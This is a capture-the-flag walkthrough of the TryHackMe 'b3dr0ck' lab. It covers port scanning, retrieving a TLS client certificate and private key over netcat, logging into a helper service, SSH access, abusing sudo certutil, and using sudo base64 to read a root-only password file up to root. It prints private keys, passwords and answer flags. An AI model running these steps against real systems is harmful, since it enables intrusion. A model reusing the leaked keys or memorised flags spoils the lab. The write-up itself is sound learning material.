# b3dr0ck Walkthrough
### Link
- https://tryhackme.com/room/b3dr0ck
---
### Synopsis
```
Barney is setting up the ABC webserver, and trying to use TLS certs to secure connections, but he's having trouble. Here's what we know...

He was able to establish nginx on port 80,  redirecting to a custom TLS webserver on port 4040
There is a TCP socket listening with a simple service to help retrieve TLS credential files (client key & certificate)
There is another TCP (TLS) helper service listening for authorized connections using files obtained from the above service
Can you find all the Easter eggs?
```
---
**Question**
### What is the barney.txt flag?

```
nmap -sC -sV -p- [IP]
```
**Namp scan result**
```
```

We fou nd **5 ports** : 22,80,4040,9009,54321.

- Port 22: We cannot log in as Anonymous

- Port 80 / 4040: We reach the web page and we have a sentence about **Over 9000** and we found the port **9009**. 
```
Welcome to ABC!

Abbadabba Broadcasting Compandy

We're in the process of building a website! Can you believe this technology exists in bedrock?!?

Barney is helping to setup the server, and he said this info was important...

Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
Bamm Bamm tried to setup a sql database, but I don't see it running.
Looks like it started something else, but I'm not sure how to turn it off...

He said it was from the toilet and OVER 9000!

Need to try and secure connections with certificates...
```

- Port 9009: To access this port, I launch **netcat** and we have a question about **what are we looking for**. Remeber to the web page and the last word: **certificates** 

```
sudo nc -v 10.10.108.30 9009
Password:
10.10.108.30 9009 (pichat) open


 __          __  _                            _                   ____   _____
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|




What are you looking for?

```
I tried something close to certificates and I obtained this answer
```
What are you looking for? dertificate
Sorry, unrecognized request: 'dertificate'

You use this service to recover your client certificate and private key
What are you looking for?
```

Let's try **public key** and **private key**
```
What are you looking for? public key
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMjExMTMwMTQ3MDVaFw0yMzExMTMwMTQ3MDVaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDEDbNV
HxTh+xKYYbfbR8bz7/vTeHxypEieox62Q1K/zMH4V0JjX+cMrefuH3Oj+/SHsgds
Dn+PvYOnHLhyMrIQFRXRmnkhx7Q4ivZ+5mq3yMyMauS29W4CV5m4zwnPw1+argiM
0QZEy02o8yAwjPUhIqDGqq4cip+zbdwN/UloFz0ICtSVrHXGu1huGE6J1IZ/kZFu
m+r2r3hvLkqCmvASrrJN1ZJjPpq0jXF1VXg+4vg0FjhYCIWBvtCXvXxd9sc5hhdB
cQrHv1e0t142hCd8kCm0cHEv6jJfS4UXur6umGzI7QYD/h5fmwJmB/M5rjLBRVZr
08eibqeToNJ2LFD1AgMBAAEwDQYJKoZIhvcNAQELBQADggEBAJPMNlPIfvwOz3hb
kpeAaMfo4XvRQ7SKU0ruAWlw0/nG3dyciTC0nxLVSlhNLVsoRZ67YiavpMElDOJG
ygo+MFcVC7Zq5EU0pbbkvKFBEuUs1rbASdzziFnYx7o9hipaLomm94EgNdG/kUfF
AzDAV1UQ4swDuTWdmeRQsJKmTExYTiyb18iYTAbXASJcIHWQDA92NqxSwnu2Ufii
pIgz8Crf1u/asuvLVAcGsAQG7dNCGCjCpEox8s264MOOcjvbh6yxalcO3uDgVWYG
ghD/6tKnlAWAbtezEu2S0l7jP+yDxC7/ysCvM4dLkGQ+Ys51f5vhdOATm/Vtrnn3
/Ps8ENc=
-----END CERTIFICATE-----


What are you looking for? private key
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAxA2zVR8U4fsSmGG320fG8+/703h8cqRInqMetkNSv8zB+FdC
Y1/nDK3n7h9zo/v0h7IHbA5/j72Dpxy4cjKyEBUV0Zp5Ice0OIr2fuZqt8jMjGrk
tvVuAleZuM8Jz8Nfmq4IjNEGRMtNqPMgMIz1ISKgxqquHIqfs23cDf1JaBc9CArU
lax1xrtYbhhOidSGf5GRbpvq9q94by5KgprwEq6yTdWSYz6atI1xdVV4PuL4NBY4
WAiFgb7Ql718XfbHOYYXQXEKx79XtLdeNoQnfJAptHBxL+oyX0uFF7q+rphsyO0G
A/4eX5sCZgfzOa4ywUVWa9PHom6nk6DSdixQ9QIDAQABAoIBAQCq2y3ALvgqAH6y
IebyyNjP2gLixovd9OH8rjejq4Q/9pfMb29B32AiIqSPVwWWkYsHftUNDI2KnSRQ
zKzJiPi5H0cGhdKu57Vd2Wz8Jp42UF5CuR1dfQJENEeZUYVBdQiqaqS046zM40ho
xoj1BsLR/7WRrUlTQlPvMPynjGceuCsMw3rqMOIE5fgUrQNFtj45n4n1vdvaGXh0
kbo+Cyg71TV7B9Bbb1HfHgttsI2UeOMNTw2uo79n3n4TzMxu7dP9uxkkW6NeRsaZ
z6zwVLnwVkQ0k3HxldW6DbnvjHkK4VgMjzHFpDn+sz9RUkcwTmF1qcF05eDU0WjX
xg6NImq5AoGBAOiUs3DAoJ74qEOYv3PjUCYXyRAifCfvqmMLagbok6kjOlZeUwil
VBrQZQH9q3320i8B7pScdxSOu9OFWhHh1rOvWgjjDeYeFyobWiOFVCvB2FDVLQ7f
gqLEvnF7H09JVqDiRATcxT83bgWvftAa1wLH0wOep+VLMz/rntvjUoHjAoGBANfL
bKe/usEFrC6hYj/I9gLewKUhvZfWJfaEBSwtqvxtP00ZJPN9pE0tTMZxRbi/CB6O
JfoJGtlqJEh2UirLCfKfvGGP2+fUb12w7kEHsApWN0aFvrmB5g/+ggzfqPW/8wxE
SgGEWslAoBm/ICImUaTV9aPIuBKX+1P3Ag0mYnlHAoGAFYxxc6jlONVhAaJNWrdc
3aqmflAzoJ+b8cFE+Y7i33DcHtRubQakXDeipCSUlv8fSiurpyk3/zeaP2bDiZSb
B9rfRKOEziVLkCMontHjkopLOHIH0rDysZH48xqtM/Nfi1hrZOfvfoPsNaqk3TMf
aKqK6nLwq1XkUa/K8CSHqHECgYEAhNCfP1+yAbsMDmcloTx+raWLzBbIKfuTwfXf
eSFia5qRq1Iee/6IcTfAWSK+Vsa8qJG0rf+MluPNEQxB5jSxGrNVrnZsUnNdV7zd
5whkQPhvbOhESsi4YH+0a1f9FcPeQ16EbgqYFeXApBgOHvaWqW1Gklenc0o3VaZh
jNZjJWECgYEA2yNL7XyGqTDf7b11YGpGUSD92SH6WLaAIErkzYEyEcW9BDEQ/fGB
JveYB5AtfetnjRqAWCK2PJITuKggphbWEBgz1uZ20ZEHOcvq3Fy0+0eEmBGGYLZa
sdepzUIkOwpRgrjgSCVrxwtHs0w6J+RfyrrWPgcG3fTAzAQxJKUL4f0=
-----END RSA PRIVATE KEY-----
```

Now we can save these 2 keys and tryto connect directly the targeted machine with **openssl** command line and the communication port **54321**

```
sudo openssl s_client -connect [IP]:54321 -cert THM_bdrock_Public -key THM_bdrock_Private
```
```
read R BLOCK
Welcome: 'Barney Rubble' is authorized.
b3dr0ck>
```
Let's try something to see how the system respond
```
b3dr0ck> ls -l
Unrecognized command: 'ls -l'

This service is for login and password hints
```

Now let's try the command **hints**
```
This service is for login and password hints
b3dr0ck> hint
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
b3dr0ck>
```
We found the **plaintext** password..... Let's SSH the targeted machine
```
ssh barney@10.10.108.30
barney@10.10.108.30's password:
barney@b3dr0ck:~$ ls -l
total 4
-rw------- 1 barney barney 38 Apr 29  2022 barney.txt
barney@b3dr0ck:~$ cat barney.txt
THM{f05780f08f0eb1de65023069d0e4c90c}
```
### Answer: THM{f05780f08f0eb1de65023069d0e4c90c}
---
**Question**
### What is fred's password?

From our SSH session with **barney**, let's chek what command **barney** can run
```
barney@b3dr0ck:~$ sudo -l
[sudo] password for barney:
Matching Defaults entries for barney on b3dr0ck:
    insults, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on b3dr0ck:
    (ALL : ALL) /usr/bin/certutil
```

```
barney@b3dr0ck:~$ sudo /usr/bin/certutil ls -l

Current Cert List: (/usr/share/abc/certs)
------------------
total 56
drwxrwxr-x 2 root root 4096 Apr 30  2022 .
drwxrwxr-x 8 root root 4096 Apr 29  2022 ..
-rw-r----- 1 root root  972 Nov 13 01:47 barney.certificate.pem
-rw-r----- 1 root root 1678 Nov 13 01:47 barney.clientKey.pem
-rw-r----- 1 root root  894 Nov 13 01:47 barney.csr.pem
-rw-r----- 1 root root 1678 Nov 13 01:47 barney.serviceKey.pem
-rw-r----- 1 root root  976 Nov 13 01:47 fred.certificate.pem
-rw-r----- 1 root root 1674 Nov 13 01:47 fred.clientKey.pem
-rw-r----- 1 root root  898 Nov 13 01:47 fred.csr.pem
-rw-r----- 1 root root 1678 Nov 13 01:47 fred.serviceKey.pem
```

Now we can check **fred** **certificate**
```
barney@b3dr0ck:~$ sudo /usr/bin/certutil cat fred.certificate.pem
Generating credentials for user: cat (fredcertificatepem)
Generated: clientKey for cat: /usr/share/abc/certs/cat.clientKey.pem
Generated: certificate for cat: /usr/share/abc/certs/cat.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAuNwGDG39+h+ON/WBx1Z5s+1UxmAoRqYMqL+3ZHIcvoDPOaNx
LdsSWHlqoNOhjG1/f9L5giqcYmcTdRx76hxfa4HKvAQ9QvoUXCzc0yyOkiZbAkcu
ZaIjzvCqFw/x7hKhjzX20lS6OlXu7NGsOGkJahAHYnfSjayvpgo3aDj9fq/Giyx3
/3g8oORKHkzOxeS/ZYOB48NglqvtrUJyVf0jQSHqVugJHrTIKdcEfWN4yA324XVc
GXmwmYkrdimF1DckF2CViC/J8GwZGzcYp+CWivmQaEY1/iLCPMb6Q8aBwEzM/+wS
k5pmIxknrPHh+lXaJO3Mqs9FtwdSBD24SXPFrwIDAQABAoIBAQC0O8kl60PZz1Rh
GNvcl2J3W+jwtSXvo8vp52oN4/hEgOAKCWG63MHpQxAEF/KFMOlDnlYoZBUvF+Jv
p0LlgZ5C+jvIzrVQDPU23YK73dBvjDflY7NH4irZg+nCLIirnryoHWw1q+gaIlid
ytwH79j+8PvSNJM0EG79Cy70TcRR87OywyncoeIWKH4wh8bYpEK6yEoePX6596SS
J4uEuxzMtiW9BJPKqkqrKU9oC0s/cwjS1lP/tLIsuyQZAyw34t58bRWZrq4YZZsu
AAC6NKb4I8aLtL+lJoDE40Qsynet4M9cFLExP4XT3Fwmu6kOcQ5kVPgcSS9JAyEH
CXHiiHphAoGBAOtfZVY4zpErTa+2dZkSzznX3gPKJQ4S69eYqXy8tqzUkk+k1Byn
QKmE1jkoEG9PopzfJ85FLQyQGFp5JSbbnfeukQZBBON89B2NXvdq80RdzQmu2JVW
db9SQDEJScLwFn7kHBFBG6VCO56f2omX+TDexpyjc/rNOxS3AZnT7Zj/AoGBAMkP
XFVkVFyRdXXd4f1W08Ed81u4/hOZe9y/vpXRyaTCZCwuXE8XpaZr1tUckwC1laut
TCsfTy9ykZDVHaODXouuewof6EMIIAfhJkv2QHQ/hT4Hh1wMiZ1gCRVf8euJMiU9
Qxv8QvDcsJ1xjsEXoyKjylMLSCCj9KwgnPaRJKNRAoGBAIpvl1i5HLXBdHXOqSgZ
KgzpbElqUZUPh+tMfRNCo2bPuCZj2eXocV3DJYSEjfYKLqh5kB4ADdj/v3MnIbTT
IvwUjnPRNiDe0222Qo7fNqmVSg1R600ahzK6G8s7nUiskW6cl+2GD86JQCux9YVL
/2LBBKwIbySqJP+wC58ASRTdAoGAI5WbYuWZ5LQ91LmLeLn4SlKRsqcgGLnuaRhq
k7uIc6eP8R3Xaowl3jlx0U/4WITK05KdS3iEHEKrrrV5RGpIvnIIBre09MAoYxyf
GYygxbJEU8EjXNA/PuIzWVwcxfIHNP4NtZNFCboVbBggCt6zGbthYKc7gcNi12AC
R8VSdbECgYB9MxUoAxr03/1pZNF/bqeT7fiOhbQ1WSkqVe9Rj+YCwID+igF/BbaY
qKzSzQfnw86pHFXotyIKO6ikPQd3HRSasWhBA3wBB8p5otUzaUeo3HtSHp4XWfAd
j9rqRxg7YukLEFI6g4VpIvwpFmZSyAwr4LivEewxCFFRkEJFoDJ7rA==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIICpjCCAY4CAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMjExMTMwMjMwMzNaFw0yMjExMTQwMjMwMzNaMB0xGzAZBgNVBAMMEmZy
ZWRjZXJ0aWZpY2F0ZXBlbTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
ALjcBgxt/fofjjf1gcdWebPtVMZgKEamDKi/t2RyHL6AzzmjcS3bElh5aqDToYxt
f3/S+YIqnGJnE3Uce+ocX2uByrwEPUL6FFws3NMsjpImWwJHLmWiI87wqhcP8e4S
oY819tJUujpV7uzRrDhpCWoQB2J30o2sr6YKN2g4/X6vxossd/94PKDkSh5MzsXk
v2WDgePDYJar7a1CclX9I0Eh6lboCR60yCnXBH1jeMgN9uF1XBl5sJmJK3YphdQ3
JBdglYgvyfBsGRs3GKfglor5kGhGNf4iwjzG+kPGgcBMzP/sEpOaZiMZJ6zx4fpV
2iTtzKrPRbcHUgQ9uElzxa8CAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAUgxJw7qo
mgOuOy7sCAc34YxOKr2fRLOdjvt0KNjVwbsrw1R0AtPGmCbwjHY/N/umMeDveq5x
zeDun0XEsG6+Um0nSBJM+OH8l7VmqrXzVMGgiUBNYvpt9Vvjn5owFrFqJRBtEczj
J3VILCIw53r6WHa8+KpXbafOrE38tIjGMjxPcz+DXlL6DC7M6y5CrWiB5R2AR58v
ErVXPZ3JrRjMFJ1RerSB/F64h0jOnaHZb9KDxFxAXOb26oweoenC1sjMjSo3SOO1
+yiNoAYa1cWdS77cNsuYw4F6T395wNw58990y8JYFuaUeVRdwLJDUw5rB2pnpzH5
Xk66qnNkVA5zdg==
-----END CERTIFICATE-----
```

Now, we can backup the **public and private key** and connect to the targeted machine as **Fred**
```
sudo /usr/local/Cellar/openssl@1.1/1.1.1s/bin/openssl s_client -connect 10.10.47.94:54321 -cert THM_Fred_Public -key THM_Fred_Private
```
```
Welcome: 'fredcertificatepem' is authorized.
b3dr0ck> hints
Password hint: YabbaDabbaD0000! (user = 'fredcertificatepem')
b3dr0ck>
```
### Answer: YabbaDabbaD0000!
---
**Question**
### What is the fred.txt flag?

Now we can SSH the targeted machine as **Fred**
```
fred@b3dr0ck:~$ whoami
fred
fred@b3dr0ck:~$ ls -l
total 4
-rw------- 1 fred fred 38 Apr 29  2022 fred.txt
fred@b3dr0ck:~$ cat fred.txt
THM{08da34e619da839b154521da7323559d}
```
### Answer: THM{08da34e619da839b154521da7323559d}
---
**Question**
### What is the root.txt flag?

Let's check **Fred** capabilities ^^
```
fred@b3dr0ck:~$ sudo -l
Matching Defaults entries for fred on b3dr0ck:
    insults, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```
We can run /usr/bin/base64 and/or base32 on **/root/pass.txt**

```
fred@b3dr0ck:~$ sudo /usr/bin/base64 /root/pass.txt
TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dO
QkdYVVJUTEpaS0ZTU1lLCg==
```
Based on this result we can convert it 
```
fred@b3dr0ck:~$ sudo /usr/bin/base64 /root/pass.txt | base64 -d | base32 -d | base64 -d
a00a12aad6b7c16bf07032bd05a31d56
```
After many attempts, we can finaly obtain this string and it looks like a **hash**. Let's try [crackstation](https://crackstation.net/)
```
flintstonesvitamins
```
```
fred@b3dr0ck:~$ su - root
Password:
root@b3dr0ck:~# whoami
root
root@b3dr0ck:~# ls -l
total 12
-rw------- 1 root root   73 Apr 11  2022 pass.txt
-rw------- 1 root root   38 Apr 29  2022 root.txt
drwx------ 3 root root 4096 Apr  9  2022 snap
root@b3dr0ck:~# cat root.txt
THM{de4043c009214b56279982bf10a661b7}
```
### Answer: THM{de4043c009214b56279982bf10a661b7}

